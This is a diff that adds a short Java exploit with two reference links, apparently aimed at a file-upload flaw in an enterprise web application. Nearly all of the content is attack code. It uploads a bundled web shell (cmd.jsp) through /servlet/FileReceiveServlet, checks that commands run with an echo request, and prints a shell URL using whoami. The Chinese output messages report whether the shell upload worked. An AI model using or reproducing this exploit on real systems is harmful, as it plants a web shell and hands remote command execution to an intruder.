@@ -1,0 +1,37 @@
+参考：
+https://nox.qianxin.com/article/25
+https://mp.weixin.qq.com/s/MaOCVYy2cjJ_dMdNrwwiaA
+
+
+exploit.java
+
+package superman.exploit;
+
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+public class App {
+    public static void main(String[] args) throws Exception {
+        String url="http://192.168.40.222";
+        Map<String, Object> metaInfo=new HashMap<String, Object>();
+        metaInfo.put("TARGET_FILE_PATH","webapps/nc_web");
+        metaInfo.put("FILE_NAME","cmd.jsp");
+        ByteArrayOutputStream baos=new ByteArrayOutputStream();
+        ObjectOutputStream oos=new ObjectOutputStream(baos);
+        oos.writeObject(metaInfo);
+        InputStream in=App.class.getResourceAsStream("cmd.jsp"); // web shell
+        byte[] buf=new byte[1024];
+        int len=0;
+        while ((len=in.read(buf))!=-1){
+            baos.write(buf,0,len);
+        }
+        HttpClient.post(url+"/servlet/FileReceiveServlet",baos.toByteArray());
+        HttpResult result=HttpClient.get(url+"/cmd.jsp?cmd=echo+aaaaaa");
+        if(result.getData().contains("aaaaaa")){
+            System.out.println("shell路径:"+url+"/cmd.jsp?cmd=whoami");
+        }else{
+            System.out.println("上传shell失败或者漏洞不存在");
+        }
+    }
+}
